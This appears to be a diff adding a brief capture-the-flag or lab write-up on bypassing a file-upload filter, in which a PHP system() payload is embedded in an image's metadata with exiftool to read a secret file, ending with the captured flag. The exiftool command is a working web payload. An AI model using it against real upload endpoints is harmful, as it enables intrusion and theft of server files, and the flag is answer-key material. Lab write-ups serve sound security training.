@@ -1,0 +1,6 @@
+- the server checks the file's content
+- By uploading test.php, which is an image but with the .php extension, the server accepted it, so no extension checks
+- We use exiftool to inject malicious code in the image through the command :
+    exiftool -comment="<?php echo system('cat /home/carlos/secret') ?>" test.php
+- We then just upload the image and access it, which will dump the image contents with the flag :)
+- Flag : kmQbb5V9jvVcQafD4JkzXCS03RSaY4by
